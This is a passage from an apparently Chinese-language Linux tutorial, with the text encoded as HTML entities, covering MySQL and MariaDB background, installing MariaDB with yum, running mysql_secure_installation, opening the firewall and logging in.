#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6280;&#x672F;&#x4E5F;&#x662F;&#x7BA1;&#x7406;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF;&#x3001;&#x529E;&#x516C;&#x81EA;&#x52A8;&#x5316;&#x7CFB;&#x7EDF;&#x3001;&#x51B3;&#x7B56;&#x652F;&#x6301;&#x7CFB;&#x7EDF;&#x7B49;&#x5404;&#x7C7B;&#x4FE1;&#x606F;&#x7CFB;&#x7EDF;&#x7684;&#x6838;&#x5FC3;&#x7EC4;&#x6210;&#x90E8;&#x5206;&#xFF0C;&#x662F;&#x8FDB;&#x884C;&#x79D1;&#x5B66;&#x7814;&#x7A76;&#x548C;&#x51B3;&#x7B56;&#x7BA1;&#x7406;&#x7684;&#x91CD;&#x8981;&#x6280;&#x672F;&#x624B;&#x6BB5;&#x3002;<br>&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x662F;&#x4E00;&#x79CD;&#x80FD;&#x591F;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x5B58;&#x653E;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5EFA;&#x7ACB;&#x3001;&#x4FEE;&#x6539;&#x3001;&#x5220;&#x9664;&#x3001;&#x67E5;&#x627E;&#x3001;&#x7EF4;&#x62A4;&#x7B49;&#x64CD;&#x4F5C;&#x7684;&#x8F6F;&#x4EF6;&#x7A0B;&#x5E8F;&#x3002;&#x5B83;&#x901A;&#x8FC7;&#x628A;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x5177;&#x4F53;&#x7684;&#x7269;&#x7406;&#x6570;&#x636E;&#x8F6C;&#x6362;&#x6210;&#x9002;&#x5408;&#x7528;&#x6237;&#x7406;&#x89E3;&#x7684;&#x62BD;&#x8C61;&#x903B;&#x8F91;&#x6570;&#x636E;&#xFF0C;&#x6709;&#x6548;&#x5730;&#x964D;&#x4F4E;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7684;&#x6280;&#x672F;&#x95E8;&#x69DB;&#xFF0C;&#x56E0;&#x6B64;&#x5373;&#x4FBF;&#x662F;&#x4ECE;&#x4E8B;Linux&#x8FD0;&#x7EF4;&#x5DE5;&#x4F5C;&#x7684;&#x5DE5;&#x7A0B;&#x5E08;&#x4E5F;&#x53EF;&#x4EE5;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x57FA;&#x672C;&#x7684;&#x7BA1;&#x7406;&#x64CD;&#x4F5C;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x8001;&#x5E08;&#x6709;&#x5FC5;&#x8981;&#x63D0;&#x9192;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#xFF0C;&#x672C;&#x8BFE;&#x7A0B;&#x7684;&#x6280;&#x672F;&#x4E3B;&#x7EBF;&#x4F9D;&#x7136;&#x662F;Linux&#x7CFB;&#x7EDF;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x800C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x53EA;&#x4E0D;&#x8FC7;&#x662F;&#x5728;&#x6B64;&#x4E3B;&#x7EBF;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x5185;&#x5BB9;&#x4E0D;&#x65AD;&#x6A2A;&#x5411;&#x6269;&#x5C55;&#x3001;&#x7EB5;&#x5411;&#x52A0;&#x6DF1;&#x7684;&#x5206;&#x652F;&#xFF0C;&#x4E0D;&#x80FD;&#x6307;&#x671B;&#x5728;&#x4E00;&#x4E24;&#x5929;&#x4E4B;&#x5185;&#x5C31;&#x53EF;&#x4EE5;&#x7CBE;&#x901A;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#x3002;&#x5982;&#x679C;&#x6709;&#x540C;&#x5B66;&#x5728;&#x5B66;&#x5B8C;&#x672C;&#x8BFE;&#x7A0B;&#x5185;&#x5BB9;&#x4E4B;&#x540E;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#x4EA7;&#x751F;&#x4E86;&#x6D53;&#x539A;&#x5174;&#x8DA3;&#xFF0C;&#x5E76;&#x5E0C;&#x671B;&#x8C0B;&#x5F97;&#x4E00;&#x4EFD;&#x76F8;&#x5173;&#x7684;&#x5DE5;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x9700;&#x8981;&#x989D;&#x5916;&#x4E3A;&#x81EA;&#x5DF1;&#x5B9A;&#x5236;&#x4E00;&#x4E2A;&#x5B66;&#x4E60;&#x89C4;&#x5212;&#x4E86;&#x3002;</p><p><img src="sql.png" alt="mariadbmysql"><br>&#x56FE;1 MariaDB&#x4E0E;Mysql&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x8457;&#x540D;LOGO</p><p>&#x65E2;&#x7136;&#x662F;&#x8BB2;&#x89E3;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x6280;&#x672F;&#xFF0C;&#x5C31;&#x80AF;&#x5B9A;&#x7ED5;&#x4E0D;&#x5F00;MySQL&#x3002;MySQL&#x662F;&#x4E00;&#x6B3E;&#x5E02;&#x573A;&#x5360;&#x6709;&#x7387;&#x975E;&#x5E38;&#x9AD8;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x6280;&#x672F;&#x6210;&#x719F;&#x3001;&#x914D;&#x7F6E;&#x6B65;&#x9AA4;&#x76F8;&#x5BF9;&#x7B80;&#x5355;&#xFF0C;&#x800C;&#x4E14;&#x5177;&#x6709;&#x826F;&#x597D;&#x7684;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;Oracle&#x516C;&#x53F8;&#x5728;2009&#x5E74;&#x6536;&#x8D2D;&#x4E86;MySQL&#x7684;&#x6BCD;&#x516C;&#x53F8;Sun&#xFF0C;&#x56E0;&#x6B64;MySQL&#x6570;&#x636E;&#x5E93;&#x9879;&#x76EE;&#x4E5F;&#x968F;&#x4E4B;&#x7EB3;&#x5165;Oracle&#x9EBE;&#x4E0B;&#xFF0C;&#x9010;&#x6B65;&#x6F14;&#x53D8;&#x4E3A;&#x4FDD;&#x6301;&#x7740;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x7684;&#x8EAB;&#x4EFD;&#xFF0C;&#x4F46;&#x53C8;&#x7533;&#x8BF7;&#x4E86;&#x591A;&#x9879;&#x5546;&#x4E1A;&#x4E13;&#x5229;&#x7684;&#x8F6F;&#x4EF6;&#x7CFB;&#x7EDF;&#x3002;&#x5F00;&#x6E90;&#x8F6F;&#x4EF6;&#x662F;&#x5168;&#x7403;&#x9ED1;&#x5BA2;&#x3001;&#x6781;&#x5BA2;&#x3001;&#x7A0B;&#x5E8F;&#x5458;&#x7B49;&#x6280;&#x672F;&#x9AD8;&#x624B;&#x5728;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x7684;&#x5927;&#x65D7;&#x4E0B;&#x7684;&#x516C;&#x5171;&#x667A;&#x6167;&#x7ED3;&#x6676;&#xFF0C;&#x81EA;&#x5DF1;&#x7684;&#x52B3;&#x52A8;&#x6210;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x516C;&#x53F8;&#x5546;&#x4E1A;&#x5316;&#x81EA;&#x7136;&#x4E5F;&#x4F24;&#x4E86;&#x4E00;&#x5927;&#x6279;&#x5F00;&#x6E90;&#x5DE5;&#x4F5C;&#x8005;&#x7684;&#x5FC3;&#xFF0C;&#x56E0;&#x6B64;&#x7531;MySQL&#x9879;&#x76EE;&#x521B;&#x59CB;&#x8005;&#x91CD;&#x65B0;&#x7814;&#x53D1;&#x4E86;&#x4E00;&#x6B3E;&#x540D;&#x4E3A;MariaDB&#x7684;&#x5168;&#x65B0;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x3002;&#x8BE5;&#x8F6F;&#x4EF6;&#x5F53;&#x524D;&#x7531;&#x5F00;&#x6E90;&#x793E;&#x533A;&#x8FDB;&#x884C;&#x7EF4;&#x62A4;&#xFF0C;&#x662F;MySQL&#x7684;&#x5206;&#x652F;&#x4EA7;&#x54C1;&#xFF0C;&#x800C;&#x4E14;&#x51E0;&#x4E4E;&#x5B8C;&#x5168;&#x517C;&#x5BB9;MySQL&#x3002;<br>&#x4E0E;&#x6B64;&#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x5404;&#x5927;&#x516C;&#x53F8;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x7740;&#x7ADE;&#x4E89;&#x5173;&#x7CFB;&#x6216;&#x5229;&#x76CA;&#x5173;&#x7CFB;&#xFF0C;&#x5916;&#x52A0;MySQL&#x5728;&#x88AB;&#x6536;&#x8D2D;&#x4E4B;&#x540E;&#x9010;&#x6E10;&#x7531;&#x5F00;&#x6E90;&#x5411;&#x95ED;&#x6E90;&#x8F6F;&#x4EF6;&#x8F6C;&#x53D8;&#xFF0C;&#x5F88;&#x591A;&#x516C;&#x53F8;&#x629B;&#x5F03;&#x4E86;MySQL&#x3002;&#x5F53;&#x524D;&#xFF0C;&#x8C37;&#x6B4C;&#x3001;&#x7EF4;&#x57FA;&#x767E;&#x79D1;&#x7B49;&#x6280;&#x672F;&#x9886;&#x57DF;&#x51B3;&#x5B9A;&#x5C06;MySQL&#x6570;&#x636E;&#x5E93;&#x4E0A;&#x7684;&#x4E1A;&#x52A1;&#x8F6C;&#x79FB;&#x5230;MariaDB&#x6570;&#x636E;&#x5E93;&#xFF0C;Linux&#x5F00;&#x6E90;&#x7CFB;&#x7EDF;&#x7684;&#x9886;&#x8896;&#x7EA2;&#x5E3D;&#x516C;&#x53F8;&#x4E5F;&#x51B3;&#x5B9A;&#x5728;RHEL 7&#x3001;CentOS 7&#x4EE5;&#x53CA;&#x6700;&#x65B0;&#x7684;Fedora&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x5C06;MariaDB&#x4F5C;&#x4E3A;&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x800C;&#x4E14;&#x7EA2;&#x5E3D;&#x516C;&#x53F8;&#x66F4;&#x662F;&#x9996;&#x6B21;&#x5C06;&#x6570;&#x636E;&#x5E93;&#x77E5;&#x8BC6;&#x52A0;&#x5165;&#x5230;&#x4E86;RHCE&#x8BA4;&#x8BC1;&#x7684;&#x8003;&#x8BD5;&#x5185;&#x5BB9;&#x4E2D;&#x3002;&#x968F;&#x540E;&#xFF0C;&#x8FD8;&#x6709;&#x6570;&#x5341;&#x4E2A;&#x5E38;&#x89C1;&#x7684;Linux&#x7CFB;&#x7EDF;&#xFF08;&#x5982;openSUSE&#x3001;Slackware&#x7B49;&#xFF09;&#x4E5F;&#x4F5C;&#x51FA;&#x4E86;&#x540C;&#x6837;&#x7684;&#x8868;&#x6001;&#x3002;<br>&#x4F46;&#x662F;&#xFF0C;&#x5766;&#x767D;&#x6765;&#x8BB2;&#xFF0C;&#x867D;&#x7136;IT&#x884C;&#x4E1A;&#x5DE8;&#x5934;&#x90FD;&#x51B3;&#x5B9A;&#x91C7;&#x7528;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x7740;MariaDB&#x8F83;&#x4E4B;&#x4E8E;MySQL&#x6709;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;&#x8001;&#x5E08;&#x7528;&#x4E86;&#x8FD1;&#x4E24;&#x5468;&#x7684;&#x65F6;&#x95F4;&#x6D4B;&#x8BD5;&#x4E86;MariaDB&#x4E0E;MySQL&#x7684;&#x533A;&#x522B;&#xFF0C;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x591A;&#x9879;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x5A92;&#x4F53;&#x6240;&#x8BF4;&#x7684;&#x90A3;&#x79CD;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;&#xFF0C;MariaDB&#x548C;MySQL&#x5728;&#x6027;&#x80FD;&#x4E0A;&#x57FA;&#x672C;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#xFF0C;&#x4E24;&#x8005;&#x7684;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#x4E5F;&#x5341;&#x5206;&#x76F8;&#x4F3C;&#x3002;&#x4ECE;&#x52A1;&#x5B9E;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x8BB2;&#xFF0C;&#x5728;&#x638C;&#x63E1;&#x4E86;MariaDB&#x6570;&#x636E;&#x5E93;&#x7684;&#x547D;&#x4EE4;&#x548C;&#x57FA;&#x672C;&#x64CD;&#x4F5C;&#x4E4B;&#x540E;&#xFF0C;&#x5728;&#x4ECA;&#x540E;&#x7684;&#x5DE5;&#x4F5C;&#x4E2D;&#x5373;&#x4F7F;&#x9047;&#x5230;MySQL&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5FEB;&#x901F;&#x4E0A;&#x624B;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x8FD9;&#x4E24;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x65E0;&#x8BBA;&#x9009;&#x62E9;&#x54EA;&#x4E00;&#x4E2A;&#x6765;&#x5B66;&#x4E60;&#x90FD;&#x6089;&#x542C;&#x541B;&#x4FBF;&#xFF0C;&#x800C;&#x672C;&#x4E66;&#x4E4B;&#x6240;&#x4EE5;&#x9009;&#x62E9;&#x4EE5;MariaDB&#x6570;&#x636E;&#x5E93;&#x8FDB;&#x884C;&#x8BB2;&#x89E3;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x4ECE;RHCE&#x8BA4;&#x8BC1;&#x8003;&#x8BD5;&#x548C;&#x6280;&#x672F;&#x5784;&#x65AD;&#x7684;&#x89D2;&#x5EA6;&#x4F5C;&#x7684;&#x51B3;&#x5B9A;&#x3002;</p><h2 id="2-&#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;"><a href="#2-&#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;" class="headerlink" title="2 &#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;"></a>2 &#x521D;&#x59CB;&#x5316;MariaDB&#x670D;&#x52A1;</h2><p>&#x76F8;&#x8F83;&#x4E8E;MySQL&#xFF0C;MariaDB&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x6709;&#x4E86;&#x5F88;&#x591A;&#x65B0;&#x9C9C;&#x7684;&#x6269;&#x5C55;&#x7279;&#x6027;&#xFF0C;&#x4F8B;&#x5982;&#x5BF9;&#x5FAE;&#x79D2;&#x7EA7;&#x522B;&#x7684;&#x652F;&#x6301;&#x3001;&#x7EBF;&#x7A0B;&#x6C60;&#x3001;&#x5B50;&#x67E5;&#x8BE2;&#x4F18;&#x5316;&#x3001;&#x8FDB;&#x7A0B;&#x62A5;&#x544A;&#x7B49;&#x3002;&#x5728;&#x914D;&#x7F6E;&#x59A5;&#x5F53;Yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x540E;&#xFF0C;&#x5373;&#x53EF;&#x5B89;&#x88C5;&#x90E8;&#x7F72;MariaDB&#x6570;&#x636E;&#x5E93;&#x4E3B;&#x7A0B;&#x5E8F;&#x53CA;&#x670D;&#x52A1;&#x7AEF;&#x7A0B;&#x5E8F;&#x4E86;&#x3002;<br>&#x5728;&#x5B89;&#x88C5;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;&#x8BB0;&#x5F97;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x52A0;&#x5165;&#x5230;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;</p><pre><code class="shell">[root@jaking ~]# yum install mariadb mariadb-serverLoaded plugins: langpacks, product-id, subscription-manager&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x7701;&#x7565;&#x90E8;&#x5206;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;Installing: mariadb x86_64 1:5.5.35-3.el7 rhel 8.9 M mariadb-server x86_64 1:5.5.35-3.el7 rhel 11 MInstalling for dependencies: perl-Compress-Raw-Bzip2 x86_64 2.061-3.el7 rhel 32 k perl-Compress-Raw-Zlib x86_64 1:2.061-4.el7 rhel 57 k perl-DBD-MySQL x86_64 4.023-5.el7 rhel 140 k perl-DBI x86_64 1.627-4.el7 rhel 802 k perl-Data-Dumper x86_64 2.145-3.el7 rhel 47 k perl-IO-Compress noarch 2.061-2.el7 rhel 260 k perl-Net-Daemon noarch 0.48-5.el7 rhel 51 k perl-PlRPC noarch 0.2020-14.el7 rhel 36 kTransaction Summary================================================================================Install 2 Packages (+8 Dependent packages)Total download size: 21 MInstalled size: 107 MIs this ok [y/d/N]: y Downloading packages:--------------------------------------------------------------------------------Total 82 MB/s | 21 MB 00:00 Running transaction checkRunning transaction testTransaction test succeededRunning transaction&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x7701;&#x7565;&#x90E8;&#x5206;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;&#x2026;Installed: mariadb.x86_64 1:5.5.35-3.el7 mariadb-server.x86_64 1:5.5.35-3.el7 Dependency Installed: perl-Compress-Raw-Bzip2.x86_64 0:2.061-3.el7  perl-Compress-Raw-Zlib.x86_64 1:2.061-4.el7  perl-DBD-MySQL.x86_64 0:4.023-5.el7  perl-DBI.x86_64 0:1.627-4.el7  perl-Data-Dumper.x86_64 0:2.145-3.el7  perl-IO-Compress.noarch 0:2.061-2.el7  perl-Net-Daemon.noarch 0:0.48-5.el7  perl-PlRPC.noarch 0:0.2020-14.el7Complete![root@jaking ~]# systemctl start mariadb [root@jaking ~]# systemctl enable mariadb ln -s &apos;/usr/lib/systemd/system/mariadb.service&apos; &apos;/etc/systemd/system/multi-user.target.wants/mariadb.service&apos;</code></pre><p>&#x5728;&#x786E;&#x8BA4;MariaDB&#x6570;&#x636E;&#x5E93;&#x8F6F;&#x4EF6;&#x7A0B;&#x5E8F;&#x5B89;&#x88C5;&#x5B8C;&#x6BD5;&#x5E76;&#x6210;&#x529F;&#x542F;&#x52A8;&#x540E;&#x8BF7;&#x4E0D;&#x8981;&#x7ACB;&#x5373;&#x4F7F;&#x7528;&#x3002;&#x4E3A;&#x4E86;&#x786E;&#x4FDD;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5B89;&#x5168;&#x6027;&#x548C;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x3002;&#x8FD9;&#x4E2A;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x6D89;&#x53CA;&#x4E0B;&#x9762;5&#x4E2A;&#x6B65;&#x9AA4;&#x3002;</p><ol><li>&#x8BBE;&#x7F6E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#xFF08;&#x6CE8;&#x610F;&#xFF0C;&#x8BE5;&#x5BC6;&#x7801;&#x5E76;&#x975E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#xFF0C;&#x8FD9;&#x91CC;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x9ED8;&#x8BA4;&#x5E94;&#x8BE5;&#x4E3A;&#x7A7A;&#xFF0C;&#x53EF;&#x76F4;&#x63A5;&#x6309;&#x56DE;&#x8F66;&#x952E;&#xFF09;&#x3002;</li><li>&#x8BBE;&#x7F6E;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x4E13;&#x6709;&#x5BC6;&#x7801;&#x3002;</li><li>&#x968F;&#x540E;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF0C;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;</li><li>&#x5220;&#x9664;&#x9ED8;&#x8BA4;&#x7684;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53D6;&#x6D88;&#x6D4B;&#x8BD5;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E00;&#x7CFB;&#x5217;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#x3002;</li><li>&#x5237;&#x65B0;&#x6388;&#x6743;&#x5217;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#x3002;<br>&#x5BF9;&#x4E8E;&#x4E0A;&#x8FF0;&#x6570;&#x636E;&#x5E93;&#x521D;&#x59CB;&#x5316;&#x7684;&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#xFF0C;&#x8001;&#x5E08;&#x5DF2;&#x7ECF;&#x5728;&#x4E0B;&#x9762;&#x7684;&#x8F93;&#x51FA;&#x4FE1;&#x606F;&#x65C1;&#x8FB9;&#x8FDB;&#x884C;&#x4E86;&#x7B80;&#x5355;&#x6CE8;&#x91CA;&#xFF0C;&#x786E;&#x4FDD;&#x5404;&#x4F4D;&#x8BFB;&#x8005;&#x66F4;&#x76F4;&#x89C2;&#x5730;&#x4E86;&#x89E3;&#x8981;&#x8F93;&#x5165;&#x7684;&#x5185;&#x5BB9;&#xFF1A;</li></ol><pre><code>[root@jaking ~]# mysql_secure_installation /usr/bin/mysql_secure_installation: line 379: find_mysql_client: command not foundNOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MariaDB      SERVERS IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!In order to log into MariaDB to secure it, we&apos;ll need the currentpassword for the root user.  If you&apos;ve just installed MariaDB, andyou haven&apos;t set the root password yet, the password will be blank,so you should just press enter here.Enter current password for root (enter for none):  &#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;&#x4E3A;&#x7A7A;&#xFF0C;&#x76F4;&#x63A5;&#x6309;&#x56DE;&#x8F66;&#x952E;OK, successfully used password, moving on...Setting the root password ensures that nobody can log into the MariaDBroot user without the proper authorisation.Set root password? [Y/n] yNew password:&#x8F93;&#x5165;&#x8981;&#x4E3A;root&#x7BA1;&#x7406;&#x5458;&#x8BBE;&#x7F6E;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5BC6;&#x7801;Re-enter new password:&#x518D;&#x6B21;&#x8F93;&#x5165;&#x5BC6;&#x7801;Password updated successfully!Reloading privilege tables.. ... Success!By default, a MariaDB installation has an anonymous user, allowing anyoneto log into MariaDB without having to have a user account created forthem.  This is intended only for testing, and to make the installationgo a bit smoother.  You should remove them before moving into aproduction environment.Remove anonymous users? [Y/n] y&#xFF08;&#x5220;&#x9664;&#x533F;&#x540D;&#x8D26;&#x6237;&#xFF09;... Success!Normally, root should only be allowed to connect from &apos;localhost&apos;.  Thisensures that someone cannot guess at the root password from the network.Disallow root login remotely? [Y/n] y&#xFF08;&#x7981;&#x6B62;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x767B;&#x5F55;&#xFF09; ... Success!By default, MariaDB comes with a database named &apos;test&apos; that anyone canaccess.  This is also intended only for testing, and should be removedbefore moving into a production environment.Remove test database and access to it? [Y/n] y&#xFF08;&#x5220;&#x9664;test&#x6570;&#x636E;&#x5E93;&#x5E76;&#x53D6;&#x6D88;&#x5BF9;&#x5B83;&#x7684;&#x8BBF;&#x95EE;&#x6743;&#x9650;&#xFF09; - Dropping test database... ... Success! - Removing privileges on test database... ... Success!Reloading the privilege tables will ensure that all changes made so farwill take effect immediately.Reload privilege tables now? [Y/n] y&#xFF08;&#x5237;&#x65B0;&#x6388;&#x6743;&#x8868;&#xFF0C;&#x8BA9;&#x521D;&#x59CB;&#x5316;&#x540E;&#x7684;&#x8BBE;&#x5B9A;&#x7ACB;&#x5373;&#x751F;&#x6548;&#xFF09; ... Success!Cleaning up...All done!  If you&apos;ve completed all of the above steps, your MariaDBinstallation should now be secure.Thanks for using MariaDB!</code></pre><p>&#x5728;&#x5F88;&#x591A;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x90FD;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x7684;&#x6280;&#x672F;&#xFF08;&#x5373;&#x7F51;&#x7AD9;&#x548C;&#x6570;&#x636E;&#x5E93;&#x4E0D;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x8BA9;root&#x7BA1;&#x7406;&#x5458;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53EF;&#x5728;&#x4E0A;&#x9762;&#x7684;&#x521D;&#x59CB;&#x5316;&#x64CD;&#x4F5C;&#x4E2D;&#x8BBE;&#x7F6E;&#x7B56;&#x7565;&#xFF0C;&#x4EE5;&#x5141;&#x8BB8;root&#x7BA1;&#x7406;&#x5458;&#x4ECE;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x3002;&#x7136;&#x540E;&#x8FD8;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x4F7F;&#x5176;&#x653E;&#x884C;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x9ED8;&#x8BA4;&#x4F1A;&#x5360;&#x7528;<code>3306</code>&#x7AEF;&#x53E3;&#xFF0C;&#x5728;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x4E2D;&#x670D;&#x52A1;&#x540D;&#x79F0;&#x7EDF;&#x4E00;&#x53EB;&#x4F5C;<code>mysql</code>&#xFF1A;</p><pre><code class="shell">[root@jaking ~]# firewall-cmd --permanent --add-service=mysqlsuccess[root@jaking ~]# firewall-cmd --reloadsuccess</code></pre><p>&#x4E00;&#x5207;&#x51C6;&#x5907;&#x5C31;&#x7EEA;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x5C06;&#x9996;&#x6B21;&#x767B;&#x5F55;MariaDB&#x6570;&#x636E;&#x5E93;&#x3002;&#x5176;&#x4E2D;&#xFF0C;-u&#x53C2;&#x6570;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x4EE5;root&#x7BA1;&#x7406;&#x5458;&#x7684;&#x8EAB;&#x4EFD;&#x767B;&#x5F55;&#xFF0C;&#x800C;-p&#x53C2;&#x6570;&#x7528;&#x6765;&#x9A8C;&#x8BC1;&#x8BE5;&#x7528;&#x6237;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;&#x503C;&#x3002;</p><pre><code class="shell">[root@jaking ~]# mysql -u root -pEnter password: &#x6B64;&#x5904;&#x8F93;&#x5165;root&#x7BA1;&#x7406;&#x5458;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5BC6;&#x7801;Welcome to the MariaDB monitor. Commands end with ; or \g.Your MariaDB connection id is 5Server version: 5.5.35-MariaDB MariaDB ServerCopyright (c) 2000, 2013, Oracle, Monty Program Ab and others.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.MariaDB 